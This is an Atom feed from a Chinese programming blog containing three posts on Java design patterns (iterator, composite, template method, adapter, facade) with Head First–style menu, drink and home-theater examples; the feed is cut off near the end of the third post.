<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dzou&#39;s Blog</title>
  
  <subtitle>No pains,no gains.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.dzou.top/"/>
  <updated>2019-08-11T04:56:38.291Z</updated>
  <id>https://www.dzou.top/</id>
  
  <author>
    <name>dzou</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java设计模式——迭代器模式和组合模式</title>
    <link href="https://www.dzou.top/post/7244f815.html"/>
    <id>https://www.dzou.top/post/7244f815.html</id>
    <published>2019-08-11T04:54:09.000Z</published>
    <updated>2019-08-11T04:56:38.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之迭代器模式以及组合模式"><a href="#Java设计模式之迭代器模式以及组合模式" class="headerlink" title="Java设计模式之迭代器模式以及组合模式"></a>Java设计模式之迭代器模式以及组合模式</h2><h3 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h3><p><strong><em>迭代器模式：提供一种方法顺序访问一个聚合对象的各个元素，而又不暴露其内部的表示。</em></strong></p><blockquote></blockquote><ul><li>用于封装对象的遍历，无论是<code>数组</code>存储还是<code>ArrayList</code>，调用统一的接口，根据多态调用。</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/21.png"><ul><li>迭代器接口：定义迭代器的方法</li><li>具体迭代器：实现不同对象的迭代器方法的不同实现</li></ul><p>迭代器模式让我们游走在聚合内的每一个元素，而又不暴露内部的实现。</p><h4 id="Head-first-设计模式例子"><a href="#Head-first-设计模式例子" class="headerlink" title="Head first 设计模式例子"></a>Head first 设计模式例子</h4><p>有一个饭店有多个菜单，由女招待把菜单的内容展示出来，这里使用迭代器模式，每个菜单都是由其他公司合并的，有不同的实现方式(数组、列表、链表)</p><ul><li>Menu</li></ul><pre><code class="java">public interface Menu {    public void addItem(String name,String price,String des);    public Iterator createIterator();}</code></pre><ul><li>MenuItem</li></ul><pre><code class="java">@Datapublic class MenuItem {    private String name;    private String des;    private String price;    public MenuItem(String name, String des, String price) {        this.name = name;        this.des = des;        this.price = price;    }}</code></pre><ul><li>Iterator</li></ul><pre><code class="java">public interface Iterator {    public Object next();    public boolean hasNext();}</code></pre><ul><li>列表式菜单——CakeMenu</li></ul><pre><code class="java">public class CakeMenu implements Menu {    private ArrayList&lt;MenuItem&gt; cakeItems;    public CakeMenu(){        cakeItems = new ArrayList&lt;&gt;();        addItem(&quot;Bread&quot;,&quot;10.00&quot;,&quot;面包&quot;);        addItem(&quot;Ice-cream&quot;,&quot;15.00&quot;,&quot;冰淇淋&quot;);        addItem(&quot;Cake&quot;,&quot;20.00&quot;,&quot;饼干&quot;);    }    public void addItem(String name,String price,String des) {        MenuItem item = new MenuItem(name,price,des);        cakeItems.add(item);    }    public Iterator createIterator() {        return new ListIterator(cakeItems);    }}</code></pre><ul><li>数组式菜单——CoffeeMenu</li></ul><pre><code class="java">public class CoffeeMenu implements Menu {    private MenuItem[] menuItems;    private final int MAX_SIZE = 10;    private int i;    public CoffeeMenu(){        menuItems = new MenuItem[MAX_SIZE];        addItem(&quot;Moka&quot;,&quot;10.00&quot;,&quot;摩卡咖啡&quot;);        addItem(&quot;Fragrant&quot;,&quot;15.00&quot;,&quot;香浓咖啡&quot;);        addItem(&quot;Milk&quot;,&quot;20.00&quot;,&quot;牛奶咖啡&quot;);    }    public void addItem(String name,String price,String des) {        MenuItem item = new MenuItem(name,price,des);        menuItems[i] = item;        i++;    }    public Iterator createIterator() {        return new ArrayIterator(menuItems);    }}</code></pre><ul><li>链表式菜单——DinnerMenu</li></ul><pre><code class="java">public class DinnerMenu implements Menu {    private LinkedList&lt;MenuItem&gt; dinnerItems;    private int i;    public DinnerMenu(){        dinnerItems = new LinkedList&lt;&gt;();        addItem(&quot;fish&quot;,&quot;100.00&quot;,&quot;糖醋鱼&quot;);        addItem(&quot;chicken&quot;,&quot;125.00&quot;,&quot;辣子鸡&quot;);        addItem(&quot;duck&quot;,&quot;200.00&quot;,&quot;北京烤鸭&quot;);    }    public void addItem(String name,String price,String des) {        MenuItem item = new MenuItem(name,price,des);        dinnerItems.add(item);    }    public Iterator createIterator() {        return new ListIterator(dinnerItems);    }}</code></pre><ul><li>ArrayIterator</li></ul><pre><code class="java">public class ArrayIterator implements Iterator {    private MenuItem[] menuItems;    private int index;    public ArrayIterator(MenuItem[] menuItems){        this.menuItems = menuItems;    }    @Override    public Object next() {        return menuItems[index++];    }    @Override    public boolean hasNext() {        if(index==menuItems.length||menuItems[index]==null){            return false;        }        return true;    }}</code></pre><ul><li>ListIterator</li></ul><pre><code class="java">public class ListIterator implements Iterator {    private List&lt;MenuItem&gt; menuItems;    private int index = 0;    public ListIterator(List&lt;MenuItem&gt; menuItems){        this.menuItems = menuItems;    }    @Override    public Object next() {        return menuItems.get(index++);    }    @Override    public boolean hasNext() {        if(index == menuItems.size()||menuItems.get(index)==null){            return false;        }        return true;    }}</code></pre><ul><li>Waitress</li></ul><pre><code class="java">public class Waitress {    private Menu cakeMenu;    private Menu coffeeMenu;    private Menu dinnerMenu;    public Waitress(Menu cakeMenu,Menu coffeeMenu,Menu dinnerMenu){        this.cakeMenu = cakeMenu;        this.coffeeMenu = coffeeMenu;        this.dinnerMenu = dinnerMenu;    }    public void printMenu(){        Iterator cakeI = cakeMenu.createIterator();        Iterator coffeeI = coffeeMenu.createIterator();        Iterator dinnerI = dinnerMenu.createIterator();        System.out.println(&quot;Menu is here:&quot;);        System.out.println(&quot;Cake:&quot;);        printMenu(cakeI);        System.out.println(&quot;Coffee:&quot;);        printMenu(coffeeI);        System.out.println(&quot;Dinner:&quot;);        printMenu(dinnerI);    }    private void printMenu(Iterator iterator) {        while (iterator.hasNext()){            MenuItem menuItem = (MenuItem) iterator.next();            System.out.println(menuItem);        }    }}</code></pre><ul><li>测试</li></ul><pre><code class="java">public static void main(String[] args) {        CakeMenu cakeMenu = new CakeMenu();        CoffeeMenu coffeeMenu = new CoffeeMenu();        DinnerMenu dinnerMenu = new DinnerMenu();        Waitress waitress = new Waitress(cakeMenu,coffeeMenu,dinnerMenu);        waitress.printMenu();    }——outputMenu is here:Cake:MenuItem{name=&#39;Bread&#39;, des=&#39;10.00&#39;, price=&#39;面包&#39;}MenuItem{name=&#39;Ice-cream&#39;, des=&#39;15.00&#39;, price=&#39;冰淇淋&#39;}MenuItem{name=&#39;Cake&#39;, des=&#39;20.00&#39;, price=&#39;饼干&#39;}Coffee:MenuItem{name=&#39;Moka&#39;, des=&#39;10.00&#39;, price=&#39;摩卡咖啡&#39;}MenuItem{name=&#39;Fragrant&#39;, des=&#39;15.00&#39;, price=&#39;香浓咖啡&#39;}MenuItem{name=&#39;Milk&#39;, des=&#39;20.00&#39;, price=&#39;牛奶咖啡&#39;}Dinner:MenuItem{name=&#39;fish&#39;, des=&#39;100.00&#39;, price=&#39;糖醋鱼&#39;}MenuItem{name=&#39;chicken&#39;, des=&#39;125.00&#39;, price=&#39;辣子鸡&#39;}MenuItem{name=&#39;duck&#39;, des=&#39;200.00&#39;, price=&#39;北京烤鸭&#39;}</code></pre><h3 id="单一原则"><a href="#单一原则" class="headerlink" title="单一原则"></a>单一原则</h3><p>新的设计原则：</p><ul><li>单一原则：一个类应该只有一个引起变化的原因。</li></ul><blockquote><p>内聚：度量一个类或者模块的紧密程度。</p><ul><li>当一类或模块被设计成支持一组不相关的功能时，它具有低内聚</li><li>被设计成支持一组相关的功能时，具有高内聚</li></ul></blockquote><h3 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h3><p><strong><em>组合模式：允许你将对象组合成树型结构来表现整体/部分。组合能让客户以一致的方式处理个别对象以及对象组合。</em></strong></p><p>以上面这个例子来说就是：我们的菜单中出现新的小菜单时，让我们处理<code>MenuItem</code>的方式和处理<code>小菜单</code>的方式是一样的，客户不需要知道它具体处理的是什么，因为它会根据多态进行处理。换句话说：我们可以忽略组合和个别对象的差别。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/22.png"><ul><li>所以他们必须有相同的基类型</li></ul><blockquote><p>组合模式让我们用树型的方式创建对象的结构，树中包含了<code>组合</code>和<code>个别的对象</code>。</p></blockquote><p>菜单需求：大菜单中有小菜单(对象组合)和食物(个别对象)，形成树型结构</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/23.png"><h4 id="修改后"><a href="#修改后" class="headerlink" title="修改后"></a>修改后</h4><ul><li><p>MenuComponent</p><blockquote><p>这里把菜单组件类定义为抽象类是因为<code>Item</code>和<code>Menu</code>没必要全部实现这些方法，各自实现需要用到的就好了，没有用到的被调用的话使用该抽象类提供的默认实现：抛出不支持异常。(Java中Iterator就是这种实现)</p></blockquote></li></ul><pre><code class="java">public abstract class MenuComponent {    public void add(MenuComponent menuComponent){        throw new UnsupportedOperationException();    }    public void remove(MenuComponent menuComponent){        throw new UnsupportedOperationException();    }    public MenuComponent getChild(int i){        throw new UnsupportedOperationException();    }    public String getName(){        throw new UnsupportedOperationException();    }    public String getDes(){        throw new UnsupportedOperationException();    }    public String getPrice(){        throw new UnsupportedOperationException();    }    public void print(){        throw new UnsupportedOperationException();    }}</code></pre><ul><li>Menu(对象组合)</li></ul><pre><code class="java">public class Menu extends MenuComponent {    private ArrayList&lt;MenuComponent&gt; menuList;    private String name;    private String des;    public Menu(String name,String des){        menuList = new ArrayList&lt;&gt;();        this.des = des;        this.name = name;    }    @Override    public void print() {        System.out.println(&quot;menu name:&quot;+getName()+                &quot;\n&quot;+&quot;menu des:&quot;+getDes());        Iterator iterator = menuList.iterator();        while (iterator.hasNext()){            MenuComponent component = (MenuComponent) iterator.next();            component.print();        }    }    @Override    public String getName() {        return name;    }    @Override    public String getDes() {        return des;    }    @Override    public MenuComponent getChild(int i) {        return menuList.get(i);    }    @Override    public void add(MenuComponent menuComponent) {        menuList.add(menuComponent);    }    @Override    public void remove(MenuComponent menuComponent) {        menuList.remove(menuComponent);    }}</code></pre><ul><li>MenuItem(个别对象)</li></ul><pre><code class="java">public class MenuItem extends MenuComponent {    private String name;    private String des;    private String price;    public MenuItem(String name, String des, String price) {        this.name = name;        this.des = des;        this.price = price;    }    @Override    public String getDes() {        return des;    }    @Override    public String getPrice() {        return price;    }    @Override    public String getName() {        return name;    }    @Override    public void print() {        System.out.println(&quot;MenuItem{&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, des=&#39;&quot; + des + &#39;\&#39;&#39; +                &quot;, price=&#39;&quot; + price + &#39;\&#39;&#39; +                &#39;}&#39;);    }}</code></pre><ul><li>Waitress</li></ul><pre><code class="java">public class Waitress {    private MenuComponent allMenus;    public Waitress(MenuComponent allMenus){        this.allMenus = allMenus;    }    public void printMenu(){        allMenus.print();    }}</code></pre><ul><li>测试</li></ul><pre><code class="java"> public static void main(String[] args) {        MenuComponent cakeMenu = new Menu(&quot;cake&quot;,&quot;饼干类&quot;);        MenuComponent dinnerMenu = new Menu(&quot;dinner&quot;,&quot;晚餐&quot;);        MenuComponent coffeeMenu = new Menu(&quot;coffee&quot;,&quot;小吃甜点咖啡&quot;);        cakeMenu.add(new MenuItem(&quot;Bread&quot;,&quot;10.00&quot;,&quot;面包&quot;));        cakeMenu.add(new MenuItem(&quot;Ice-cream&quot;,&quot;15.00&quot;,&quot;冰淇淋&quot;));        cakeMenu.add(new MenuItem(&quot;Cake&quot;,&quot;20.00&quot;,&quot;饼干&quot;));        coffeeMenu.add(new MenuItem(&quot;Moka&quot;,&quot;10.00&quot;,&quot;摩卡咖啡&quot;));        coffeeMenu.add(new MenuItem(&quot;Fragrant&quot;,&quot;15.00&quot;,&quot;香浓咖啡&quot;));        coffeeMenu.add(new MenuItem(&quot;Milk&quot;,&quot;20.00&quot;,&quot;牛奶咖啡&quot;));        dinnerMenu.add(new MenuItem(&quot;fish&quot;,&quot;100.00&quot;,&quot;糖醋鱼&quot;));        dinnerMenu.add(new MenuItem(&quot;chicken&quot;,&quot;125.00&quot;,&quot;辣子鸡&quot;));        dinnerMenu.add(new MenuItem(&quot;duck&quot;,&quot;200.00&quot;,&quot;北京烤鸭&quot;));        MenuComponent allMenus = new Menu(&quot;allMenus&quot;,&quot;所有菜单&quot;);        allMenus.add(cakeMenu);        allMenus.add(dinnerMenu);        allMenus.add(coffeeMenu);        Waitress waitress = new Waitress(allMenus);        waitress.printMenu();    }</code></pre><ul><li>output</li></ul><pre><code class="java">menu name:allMenusmenu des:所有菜单menu name:cakemenu des:饼干类MenuItem{name=&#39;Bread&#39;, des=&#39;10.00&#39;, price=&#39;面包&#39;}MenuItem{name=&#39;Ice-cream&#39;, des=&#39;15.00&#39;, price=&#39;冰淇淋&#39;}MenuItem{name=&#39;Cake&#39;, des=&#39;20.00&#39;, price=&#39;饼干&#39;}menu name:dinnermenu des:晚餐MenuItem{name=&#39;fish&#39;, des=&#39;100.00&#39;, price=&#39;糖醋鱼&#39;}MenuItem{name=&#39;chicken&#39;, des=&#39;125.00&#39;, price=&#39;辣子鸡&#39;}MenuItem{name=&#39;duck&#39;, des=&#39;200.00&#39;, price=&#39;北京烤鸭&#39;}menu name:coffeemenu des:小吃甜点咖啡MenuItem{name=&#39;Moka&#39;, des=&#39;10.00&#39;, price=&#39;摩卡咖啡&#39;}MenuItem{name=&#39;Fragrant&#39;, des=&#39;15.00&#39;, price=&#39;香浓咖啡&#39;}MenuItem{name=&#39;Milk&#39;, des=&#39;20.00&#39;, price=&#39;牛奶咖啡&#39;}</code></pre><p><strong><em>但是这么一看，好像违反了单一原则，一个类不但要管理Item还要管理Menu</em></strong></p><ul><li>但是它这样做得到的是对象和对象组合的一致，被一视同仁对待。如果加了判断是否为Item和Menu的代码就失去了在这种性质</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>迭代器模式：</p><ul><li>迭代器允许访问聚合的元素，而不需要暴露它内部实现。</li><li>迭代器将遍历工作封装进对象中，解决不同的遍历实现。</li><li>迭代器提供一个通用接口遍历，根据多态机制。</li><li>努力使用一个类一个责任原则</li></ul><p>组合模式：</p><ul><li>提供一个树型结构存储对象和对象组合</li><li>组合模式将单个对象和对象组合一视同仁</li><li>任意对象或组合都是一个组件(抽象基类继承)</li><li>透明性：客户将组合和对象一视同仁</li></ul><p>总结一下学到的设计原则：</p><ul><li><p>类应该对扩展开放，对修改关闭</p></li><li><p>把变化的抽取出来，不要和不变化的放在一起。</p></li><li><p>针对接口编程，不针对实现编程。</p></li><li><p>多用组合，少用继承。</p></li><li><p>单一原则：一个类应该只有一个引起变化的原因。</p></li><li><p>依赖倒置：要依赖抽象，不依赖具体类。</p></li><li><p>为了交互对象之间的松耦合的设计而努力。</p></li><li><p>好莱坞原则：别调用我们，我们会调用你。</p></li><li><p>最少设计原则：只和你的密友谈话(减少耦合)。</p></li></ul>]]></content>
    
    <summary type="html">
    
      迭代器模式：提供一种方法顺序访问一个聚合对象的各个元素，而又不暴露其内部的表示.迭代器模式：提供一种方法顺序访问一个聚合对象的各个元素，而又不暴露其内部的表示
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——模板方法模式</title>
    <link href="https://www.dzou.top/post/55d3fc38.html"/>
    <id>https://www.dzou.top/post/55d3fc38.html</id>
    <published>2019-08-10T11:25:22.000Z</published>
    <updated>2019-08-10T11:40:16.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之模板方法模式"><a href="#Java设计模式之模板方法模式" class="headerlink" title="Java设计模式之模板方法模式"></a>Java设计模式之模板方法模式</h2><p><strong><em>模板方法：定义了一个算法的步骤，并允许子类为一个或多个步骤提供实现。</em></strong></p><p>模板方法使得子类在可以不改变算法结构的情况下，重新定义算法的某些步骤。</p><blockquote><p>这个模式用来定义一个模板方法，这个方法将总的算法定义成多个步骤，其中步骤可以是抽象的，由子类负责实现；其中不变的步骤(共有的)由该抽象类本身实现。（和策略模式很像，但是策略模式使用组合，更加解耦）</p></blockquote><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/20.png"><h3 id="方法分为三种"><a href="#方法分为三种" class="headerlink" title="方法分为三种"></a>方法分为三种</h3><ol><li><strong>抽象方法</strong>：一个抽象方法由抽象类声明、由其具体子类实现。</li><li><strong>具体方法</strong>：一个具体方法由一个抽象类或具体类声明并实现。</li><li><strong>钩子方法</strong>：一个钩子方法由一个抽象类或具体类声明并实现，而其子类可能会加以扩展。通常在父类中给出的实现是一个空实现，并以该空实现作为方法的默认实现，当然钩子方法也可以提供一个非空的默认实现。</li></ol><h3 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h3><p>钩子方法是指步骤中<code>可选的</code>部分，可以使用钩子为某些步骤做判断是否要执行</p><h4 id="挂钩"><a href="#挂钩" class="headerlink" title="挂钩"></a>挂钩</h4><p>与某些步骤有关系(挂钩)的钩子方法。</p><pre><code class="java">//这个wantCondiments就是一个挂钩if(wantCondiments()) {            addCondiments();        }</code></pre><h3 id="Head-first-设计模式案例"><a href="#Head-first-设计模式案例" class="headerlink" title="Head first 设计模式案例"></a>Head first 设计模式案例</h3><p><strong><em>饮料类的生产步骤：</em></strong></p><ol><li>烧水</li><li>冲泡</li><li>等待</li><li>加原料</li></ol><p>其中<code>2</code>和<code>4</code>是抽象方法，不同饮料有不同的实现，<code>1</code>和<code>3</code>是不变的，具体的实现，由抽象类完成；判断用户<code>是否需要加原料</code>就是一个钩子hook。</p><pre><code class="java">public abstract class Drinks {    /**     * 这就是模板方法 里面调用了相关的算法（自己实现的和抽象的由子类实现的）     */    final void prepareDrinks(){        //烧水        boilWater();        //冲泡        pourCup();        //等待        waitForWhile();        //添加原料        //wantCondiments是挂钩        if(wantCondiments()) {            addCondiments();        }    }    protected boolean wantCondiments() {        return true;    }    private void boilWater(){        System.out.println(&quot;步骤一：正在烧水&quot;);    }    protected abstract void pourCup();    protected abstract void addCondiments();    private void waitForWhile(){        System.out.println(&quot;步骤三：等待5分钟&quot;);    }}</code></pre><ul><li>咖啡</li></ul><pre><code class="java">public class CoffeeDrinks extends Drinks{    protected void pourCup() {        System.out.println(&quot;步骤二：倒入咖啡粉冲泡&quot;);    }    protected void addCondiments() {        System.out.println(&quot;步骤四：添加牛奶、摩卡和奶泡&quot;);    }    @Override    protected boolean wantCondiments() {        try {            char want = getUserInput();            return want == &#39;y&#39;;        } catch (IOException e) {            e.printStackTrace();        }        return super.wantCondiments();    }    private char getUserInput() throws IOException {        System.out.println(&quot;请输入你是否需要添加原料(y/n):&quot;);        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));        return  (char) in.read();    }}</code></pre><ul><li>茶水</li></ul><pre><code class="java">public class TeaDrinks extends Drinks{    protected void pourCup() {        System.out.println(&quot;步骤二：添加茶叶冲泡&quot;);    }    protected void addCondiments() {        System.out.println(&quot;步骤四：放入少量的柠檬&quot;);    }    @Override    protected boolean wantCondiments() {        try {            char want = getUserInput();            return want == &#39;y&#39;;        } catch (IOException e) {            e.printStackTrace();        }        return super.wantCondiments();    }    private char getUserInput() throws IOException {        System.out.println(&quot;请输入你是否需要添加原料(y/n):&quot;);        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));        return  (char) in.read();    }}</code></pre><ul><li>测试结果</li></ul><pre><code class="java">步骤一：正在烧水步骤二：倒入咖啡粉冲泡步骤三：等待5分钟请输入你是否需要添加原料(y/n):n步骤一：正在烧水步骤二：添加茶叶冲泡步骤三：等待5分钟请输入你是否需要添加原料(y/n):y步骤四：放入少量的柠檬</code></pre><h3 id="好莱坞原则"><a href="#好莱坞原则" class="headerlink" title="好莱坞原则"></a>好莱坞原则</h3><p><strong><em>新的设计原则：</em></strong></p><ul><li>好莱坞原则：别调用我们，我们会调用你。(高层组件对待低层组件的方式)</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/19.png"><h3 id="好莱坞原则和模板方法"><a href="#好莱坞原则和模板方法" class="headerlink" title="好莱坞原则和模板方法"></a>好莱坞原则和模板方法</h3><p>定义算法的抽象类就是我们的高层组件，它的子类就是低层组件，低层组件无法调用高层组件，减少<code>依赖</code></p><ul><li><code>依赖倒置原则</code>教我们少用具体实现类，多用接口、抽象。</li><li><code>好莱坞原则</code>是一种创建算法、框架的技巧，减少依赖。</li></ul><h3 id="JDK中模板方法"><a href="#JDK中模板方法" class="headerlink" title="JDK中模板方法"></a>JDK中模板方法</h3><ul><li>数组的<code>sort</code>方法</li><li>swing的<code>paint</code>方法</li></ul><h3 id="策略模式和模板方法模式"><a href="#策略模式和模板方法模式" class="headerlink" title="策略模式和模板方法模式"></a>策略模式和模板方法模式</h3><ul><li>策略模式使用组合，模板方法使用继承</li><li>模板方法模式需要更少的对象</li><li>策略模式更有弹性(组合)，模板方法模式耦合度高，依赖多</li></ul>]]></content>
    
    <summary type="html">
    
      模板方法：定义了一个算法的步骤，并允许子类为一个或多个步骤提供实现。这个模式用来定义一个模板方法，这个方法将总的算法定义成多个步骤，其中步骤可以是抽象的，由子类负责实现；其中不变的步骤(共有的)由该抽象类本身实现。（和策略模式很像，但是策略模式使用组合，更加解耦）
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——适配器模式及外观模式</title>
    <link href="https://www.dzou.top/post/519a7c00.html"/>
    <id>https://www.dzou.top/post/519a7c00.html</id>
    <published>2019-08-08T04:41:33.000Z</published>
    <updated>2019-08-08T04:43:31.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之适配器模式和外观模式"><a href="#Java设计模式之适配器模式和外观模式" class="headerlink" title="Java设计模式之适配器模式和外观模式"></a>Java设计模式之适配器模式和外观模式</h2><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><p><strong><em>适配器模式：将一个类的接口，转换成客户期望的有两个接口。适配器让原来的接口不兼容的类可以合作无间。</em></strong></p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/16.png"><ul><li>类适配器：多重继承完成，Java中不允许，高耦合</li><li>对象适配器：只用组合完成，低耦合</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/18.png"><ol><li>创建目标接口</li></ol><pre><code class="java">public interface Target {    //这是源类Adapteee没有的方法    public void Request(); }</code></pre><ol start="2"><li>创建被适配器</li></ol><pre><code class="java">public class Adaptee {    public void SpecificRequest(){    }}</code></pre><ol start="3"><li>创建适配器类（Adapter）</li></ol><pre><code class="java">class Adapter implements Target{      // 直接关联被适配类      private Adaptee adaptee;      // 可以通过构造函数传入具体需要适配的被适配类对象      public Adapter (Adaptee adaptee) {          this.adaptee = adaptee;      }      @Override    public void Request() {          // 这里是使用委托的方式完成特殊功能          this.adaptee.SpecificRequest();      }  }  </code></pre><ol start="4"><li>适配器使用</li></ol><pre><code class="java">public class AdapterPattern {    public static void main(String[] args){        //需要先创建一个被适配类的对象作为参数          Target mAdapter = new Adapter(new Adaptee())；        mAdapter.Request();    }}</code></pre><h4 id="适配器模式实际应用"><a href="#适配器模式实际应用" class="headerlink" title="适配器模式实际应用"></a>适配器模式实际应用</h4><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/17.png"><p>JDK以前使用<code>Enumeration</code>枚举接口遍历，现在使用<code>Iterator</code>迭代器</p><pre><code class="java">public interface Enumeration&lt;E&gt; {    boolean hasMoreElements();    E nextElement();}</code></pre><pre><code class="java">public interface Iterator&lt;E&gt; {    boolean hasNext();    E next();    default void remove() {        throw new UnsupportedOperationException(&quot;remove&quot;);    }}</code></pre><p>我们写一个适配器将<code>枚举</code>适配到<code>迭代器</code></p><ul><li>目标接口：迭代器</li><li>被适配接口：枚举接口</li></ul><p><code>Enumeration</code>的<code>hasMoreElements</code>就对应<code>Iterator</code>的<code>hasNext</code>；<code>nextElement</code>对应<code>next</code>；</p><p>Enumeration不支持<code>remove</code>，就像Iterator设计好的，抛出一个不支持的运行时异常。</p><pre><code class="java">public class EnumerationIteratorAdapter implements Iterator {    private Enumeration enumeration;    public EnumerationIteratorAdapter(Enumeration enumeration){        this.enumeration = enumeration;    }    public boolean hasNext() {        return enumeration.hasMoreElements();    }    public Object next() {        return enumeration.nextElement();    }    public void remove() {        throw new UnsupportedOperationException();    }}</code></pre><p>测试：<code>Vector</code></p><pre><code class="java">public static void main(String[] args) {        Vector&lt;Double&gt; vector = new Vector&lt;&gt;();        vector.add(12.21);        vector.add(10.26);        EnumerationIteratorAdapter enumerationIteratorAdapter = new EnumerationIteratorAdapter(vector.elements());        double a;        while (enumerationIteratorAdapter.hasNext()){            a = (double) enumerationIteratorAdapter.next();            System.out.println(a);        }    }</code></pre><p>我们再写一个适配器将<code>枚举</code>适配到<code>迭代器</code></p><ul><li>被适配接口：迭代器</li><li>目标接口：枚举接口</li></ul><pre><code class="java">public class IteratorEnumerationAdapter implements Enumeration {    private Iterator iterator;    public IteratorEnumerationAdapter(Iterator iterator){        this.iterator = iterator;    }    public boolean hasMoreElements() {        return iterator.hasNext();    }    public Object nextElement() {        return iterator.next();    }}</code></pre><p>测试：<code>ArrayList</code></p><pre><code class="java">ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;();        list.add(&quot;1&quot;);        list.add(&quot;2&quot;);        list.add(&quot;3&quot;);        list.add(&quot;4&quot;);        IteratorEnumerationAdapter iteratorEnumerationAdapter = new IteratorEnumerationAdapter(list.iterator());        String a = &quot;&quot;;        while (iteratorEnumerationAdapter.hasMoreElements()){            a = (String) iteratorEnumerationAdapter.nextElement();            System.out.println(a);        }</code></pre><h4 id="装饰者和适配器"><a href="#装饰者和适配器" class="headerlink" title="装饰者和适配器"></a>装饰者和适配器</h4><ul><li>适配器：存在不被客户知道，客户只知道请求对应的行为，适配器帮助客户和被适配者解耦，<code>将一个接口转换为另一个接口</code></li><li>装饰者：<code>不改变接口，但加入责任</code></li><li>适配器将一个对象包装起来以改变其接口，装饰者将对象包装起来以增加新的行为或者责任。</li></ul><h3 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h3><p><strong><em>外观模式：提供了一个同一的接口，用来访问子系统中的一群接口。外观定义了一个高层接口，让子系统更容易使用。</em></strong></p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/15.png"><p><code>新的设计原则</code>：</p><ul><li>最少设计原则：只和你的密友谈话</li></ul><p>设计中不要让太多的类耦合在一起，免得修改系统中的一部分又会影响到另一部分。如果系统各个部分依赖太多，这个系统会需要大量成本维护。</p><p>像下面这个代码：</p><pre><code class="java">public void getTemp(){    //耦合了三个类    return station.getFirstTemp().getSecondTemp();}</code></pre><p>该原则缺点：</p><p>虽然减少了对象的依赖，但是也会导致更多的类被创建出来用于处理组件的沟通，导致系统复杂度高，并且降低性能。</p><h4 id="外观模式的使用"><a href="#外观模式的使用" class="headerlink" title="外观模式的使用"></a>外观模式的使用</h4><p>一个私人影院由多个子系统构成:DVD播放器、投影仪、自动屏幕、环绕立体声、爆米花机</p><p>你每次观影之前需要做很多准备工作，结束还要做很多清理工作</p><p>我们可以使用外观模式，提供一个更合理的接口类，简化你的子系统的使用。</p><ul><li>该外观接口中有<code>watchMovie</code>方法，里面综合了各个子系统需要做的一切准备工作</li><li><code>endMovie</code>方法综合了所有的清理工作</li></ul><p>接口</p><pre><code class="java">public interface HomeTheaterFacadeAPI {    public void watchMovie();    public void endMovie();}</code></pre><pre><code class="java">public class HomeTheaterFacade implements HomeTheaterFacadeAPI{    private Amplifier amplifier;    private CDplayer cDplayer;    private DVDplayer dvDplayer;    private PopCornPopper popCornPopper;    private Screen screen;    private TheaterLight theaterLight;    private Projector projector;    public HomeTheaterFacade(Amplifier amplifier,                             CDplayer cDplayer,                             DVDplayer dvDplayer,                             PopCornPopper popCornPopper,                             Screen screen,                             TheaterLight theaterLight,                             Projector projector){        this.amplifier = amplifier;        this.cDplayer = cDplayer;        this.dvDplayer = dvDplayer;        this.popCornPopper = popCornPopper;        this.screen = screen;        this.theaterLight = theaterLight;        this.projector = projector;    }    public void watchMovie() {        System.out.println(&quot;准备开始看电影&quot;);        popCornPopper.on();        popCornPopper.pop();        theaterLight.dim(10);        screen.down();        projector.open();        amplifier.on();        amplifier.setDvdAndCd();        amplifier.setVolume(20);        dvDplayer.open();        cDplayer.open();    }    public void endMovie() {        System.out.println(&quot;正在关闭设备&quot;);        popCornPopper.close();        theaterLight.close();        screen.up();        projector.close();        amplifier.close();        dvDplayer.close();        cDplayer.close();    }}</code></pre><h3 id="外观模式和适配器的使用"><a href="#外观模式和适配器的使用" class="headerlink" 